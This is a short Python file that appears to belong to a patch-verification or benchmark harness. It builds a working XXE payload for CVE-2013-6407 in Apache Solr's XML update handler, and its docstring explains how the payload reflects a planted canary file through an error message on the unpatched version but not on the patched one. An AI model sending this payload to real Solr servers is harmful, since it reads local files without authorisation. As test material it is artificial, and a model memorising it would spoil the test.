#!/usr/bin/env python3
"""[GIVEN] CVE-2013-6407 seed exploit for apache-solr-cve-2013-6408 -- REAL SERVER, EXTERNAL HTTP.

The classic Solr XXE vector: an XML update document POSTed over HTTP to the XML UpdateRequestHandler
(/solr/collection1/update) is parsed by org.apache.solr.handler.loader.XMLLoader, whose
XMLInputFactory (pre-fix) resolves external entities. The document declares an external SYSTEM entity
pointing at a local file and references it in a field value; the field is a dynamic int field
(schema `*_i`), so the resolved file content is fed to Integer parsing and REFLECTED verbatim in the
handler's error response ("... For input string: \"<file contents>\" ..."):

    <?xml version="1.0"?>
    <!DOCTYPE add [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <add><doc><field name="id">pcb-xxe</field><field name="pcb_i">&xxe;</field></doc></add>

On V0 (Solr 4.0.0) XMLLoader.init() configures the factory with NO EmptyEntityResolver, so &xxe;
expands to the file content and the planted flag is surfaced in the HTTP response (REACHES).
On V1 (Solr 4.1.0, CVE-2013-6407 / SOLR-3895 patched) XMLLoader.init() now calls
EmptyEntityResolver.configureXMLInputFactory(inputFactory), which installs a resolver returning a
closed/empty stream for external entities -> &xxe; expands to nothing -> the flag never appears
(BLOCKED). The block on V1 is specifically the XMLLoader guard the CVE-2013-6407 fix added.
"""

# The XXE canary file is planted OUTSIDE the app dir at /flag (see entrypoint.sh / docker-compose.yml).
CANARY_FILE = "file:///flag"


def candidate():
    return {
        "id": "cve-2013-6407-xmlloader-xxe",
        "handler": "xmlloader",  # -> POST /solr/collection1/update (org.apache.solr.handler.loader.XMLLoader)
        "payload": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE add [ <!ENTITY xxe SYSTEM "' + CANARY_FILE + '"> ]>'
            '<add><doc><field name="id">pcb-xxe</field>'
            '<field name="pcb_i">&xxe;</field></doc></add>'
        ),
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
